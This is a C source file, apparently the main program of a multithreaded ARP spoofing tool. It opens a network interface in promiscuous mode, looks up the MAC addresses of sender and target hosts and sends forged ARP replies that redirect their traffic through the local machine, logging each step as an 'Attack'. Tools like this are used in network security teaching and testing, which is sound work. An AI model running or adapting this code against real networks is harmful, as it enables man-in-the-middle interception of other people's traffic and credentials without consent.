#include "arp_spoof.h"

int main(int argc, char** argv){
    uint32_t i;
    uint32_t ret;
    pthread_t thread[MAX_THREAD_NUM];
    struct Pdata data[MAX_THREAD_NUM];
    time_t timer;
    struct tm* tm_info;
    char logFolder[MAX_FOLDER_NAME_LEN];

    /* check args */
    if(argc < 4 || argc & 1 || argc > MAX_THREAD_NUM*2){
        printf("usage : %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n",argv[0]);
        return -1;
    }

    /* make log folder with time */
    time(&timer);
    tm_info = localtime(&timer);
    strftime(logFolder, MAX_FOLDER_NAME_LEN, "./log_%Y%m%d%H%M%S", tm_info);
    if(mkdir(logFolder, 0777)){
        fprintf(stderr, "Couldn't make log Folder name: %s",logFolder);
        return -1;
    }

    /* create Threads */
    for(i=0; i * 2 + 2 < argc ;i++){
        data[i].idx = i;
        data[i].dev = argv[1];
        data[i].SenderIP = argv[2 + i*2];
        data[i].TargetIP = argv[3 + i*2];
        data[i].fold = logFolder;

        if(pthread_create(&thread[i], NULL, &thread_main, (void *)&data[i])){
            fprintf(stderr, "Couldn't make Thread %d\n",i);
            return -1;
        }
        printf("Thread %d start\n",i);
    }

    printf("Thread running...\n");
    printf("Exit Process: Ctrl + C\n");

    for(i=0; i * 2 + 2 < argc; i++){
        pthread_join(thread[i], (void**)&ret );
    }
    return 0;
}

void* thread_main(void* arg){
    pcap_t *handle;   /* Session handle */
    char *dev;  /* device to communication */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct ether_addr LocalMac;   /* my mac address */
    struct ether_addr TargetMac;
    struct ether_addr SenderMac;
    struct in_addr LocalIP, SenderIP, TargetIP;
    struct Pdata* data = (struct Pdata*)arg;
    char LogFilePath[MAX_FILEPATH_LEN];

    sprintf(LogFilePath, "%s/thread_%d_%s_%s", data->fold, data->idx, data->SenderIP, data->TargetIP);
    /* check arguments are IP format */
    if(inet_pton(AF_INET, data->SenderIP, &SenderIP) != 1){
        return (void*)-1;
    }
    if(inet_pton(AF_INET, data->TargetIP, &TargetIP) != 1){
        return (void*)-1;
    }
    /* Define device */
    dev = data->dev;

    LOG(LogFilePath,"**********************************\n");
    LOG(LogFilePath,"Spoofing Program Start!!\n");
    LOG(LogFilePath,"Interface is %s\n",dev);
    LOG(LogFilePath,"Sender IP is %s\n",inet_ntoa(SenderIP));
    LOG(LogFilePath,"Target IP is %s\n",inet_ntoa(TargetIP));

    /* Open session in promiscuous mode */
    if( (handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf)) == NULL){
        fprintf(stderr, "Couldn't open device(Thread %d) %s: %s\n", data->idx, dev, errbuf);
        return (void*)2;
    }
    /* Get Local IP addr */
    if(GetLocalIP(dev, &LocalIP) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't get IPv4(Thread %d)\n", data->idx);
        return (void*)2;
    }

    LOG(LogFilePath,"Local IP is %s\n",inet_ntoa(LocalIP));

    LOG(LogFilePath,"**********************************\n");
    LOG(LogFilePath,"Get Local Mac Address...\n");

    /* Get Local Mac Address */
    if(GetLocalMac(dev, &LocalMac) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't Get local Mac Address(Thread %d)\n", data->idx);
        return (void*)2;
    }

    LOG(LogFilePath,"Success!!\n");
    LOG(LogFilePath,"Local Mac Address is %s\n",ether_ntoa(&LocalMac));

    LOG(LogFilePath,"**********************************\n");
    LOG(LogFilePath,"Get Sender, Target Mac Address...\n");

    /* Get Sender Mac Address */
    if(GetMac(LogFilePath, handle, LocalMac, LocalIP, SenderIP, &SenderMac) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't Get Sender Mac Address(Thread %d)\n", data->idx);
        return (void*)2;
    }

    /* Get Target Mac Address */
    if(GetMac(LogFilePath, handle, LocalMac, LocalIP, TargetIP, &TargetMac) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't Get Target Mac Address(Thread %d)\n", data->idx);
        return (void*)2;
    }

    LOG(LogFilePath,"Sender Mac Address is %s\n",ether_ntoa(&SenderMac));
    LOG(LogFilePath,"Target Mac Address is %s\n",ether_ntoa(&TargetMac));
    LOG(LogFilePath,"**********************************\n");
    LOG(LogFilePath,"Attack Start\n");
    LOG(LogFilePath,"Generate Arp Reply Packet %s is at %s\n",inet_ntoa(TargetIP), ether_ntoa(&LocalMac));

    /* Generate Fake Arp Reply Packet and send */
    if(ArpSpoof(LogFilePath, handle,SenderMac,LocalMac, LocalIP, TargetIP, TargetMac, SenderIP) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't Attack(Thread %d)\n", data->idx);
        return (void*)2;
    }

    LOG(LogFilePath,"Done!\n");
    return (void*)0;
}

